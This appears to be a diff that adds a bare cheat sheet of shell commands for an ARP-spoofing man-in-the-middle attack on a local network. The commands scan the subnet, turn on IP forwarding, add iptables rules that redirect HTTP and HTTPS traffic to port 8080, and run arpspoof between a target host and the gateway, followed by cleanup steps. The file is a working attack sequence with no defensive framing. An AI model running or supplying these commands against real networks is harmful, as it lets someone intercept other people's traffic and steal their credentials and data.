@@ -1,0 +1,19 @@
+# Network Scan
+sudo netdiscover -r 192.168.0.0/24
+
+# IP Forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# iptables Rules
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+# ARP Spoofing
+sudo arpspoof -i wlan0 -t 192.168.0.102 192.168.0.1
+sudo arpspoof -i wlan0 -t 192.168.0.1 192.168.0.102
+
+# Cleanup
+sudo killall arpspoof
+sudo sysctl -w net.ipv4.ip_forward=0
+sudo iptables -F
+sudo iptables -t nat -F
